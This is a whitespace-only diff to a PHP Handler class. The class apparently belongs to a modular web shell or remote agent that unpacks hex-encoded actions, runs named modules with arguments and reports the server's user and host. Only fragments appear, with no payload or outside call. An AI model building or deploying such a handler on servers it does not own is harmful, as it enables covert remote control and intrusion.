@@ -21,7 +21,7 @@ class Handler
 
     private $REQ_ACTION_KEY                  = "action";
     private $REQ_MSG_KEY                     = "data";
-    
+
     private $REQ_MOD_NAME_KEY                = "name";
     private $REQ_MOD_CONTENT_KEY             = "content";
     private $REQ_MOD_ARGS_KEY                = "args";
@@ -29,7 +29,7 @@ class Handler
 
     private $MOD_ARGS_VAR                    = "#{ARGS}";
     private $MOD_CWD_VAR                     = "#{CWD}";
-    
+
     private $RES_STATUS_KEY                  = "status";
     private $RES_MESSAGE_KEY                 = "message";
 
@@ -132,7 +132,7 @@ class Handler
         $fields = explode($this->FIELD_SEPARATOR, $packed_request);
         if (sizeof($fields) < 1)
             throw new Exception("unpack_data(): err explode() fields < 1", 1);
-        
+
         $data = array();
         foreach ($fields as $field)
         {
@@ -164,7 +164,7 @@ class Handler
         $phpuname_fields = explode(" ", php_uname());
         if ($phpuname_fields[0] === "Windows")
             return @php_uname('n') . "\\" . getenv("username");
-        
+
         $user_id = @posix_getuid();
         $user_info = @posix_getpwuid($user_id);
         return $user_info['name'];
@@ -215,7 +215,7 @@ class Handler
     {
         if (!array_key_exists($this->REQ_MSG_KEY, $unpacked_request))
             return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_ACTION_DATA);
-        
+
         $action_data = @hex2bin($unpacked_request[$this->REQ_MSG_KEY]);
         if ($action_data === false)
             return $this->generate_response($this->ERR_CODE, $this->ERR_INVALID_ACTION_DATA);
@@ -271,7 +271,7 @@ class Handler
             $mod_data = $mod_response_unpack[$this->MOD_RES_MESSAGE];
         else
             $mod_data = @hex2bin($mod_response_unpack[$this->MOD_RES_MESSAGE]);
-        
+
         if ($mod_data === false)
             throw new Exception($this->ERR_INVALID_MODULE_RESP_CONTENT, 1);
 
